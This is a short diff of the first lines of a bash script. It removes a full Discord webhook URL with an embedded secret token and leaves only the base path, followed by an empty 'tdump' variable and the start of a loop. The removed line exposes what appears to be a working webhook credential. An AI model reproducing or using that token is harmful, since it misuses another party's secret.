@@ -1,6 +1,6 @@
 #!/bin/bash
 
-WEBHOOK="https://discord.com/api/webhooks/1183726035708149781/Fqb-vjgJZz9AeqGQVdwoiYX7kxLkM5IrAQdCRDBqJN458tvjV8js1yFZm6X96NTQ9wM2"
+WEBHOOK="https://discord.com/api/webhooks/"
 tdump=
 while [ -z "$tdump" ]
 do
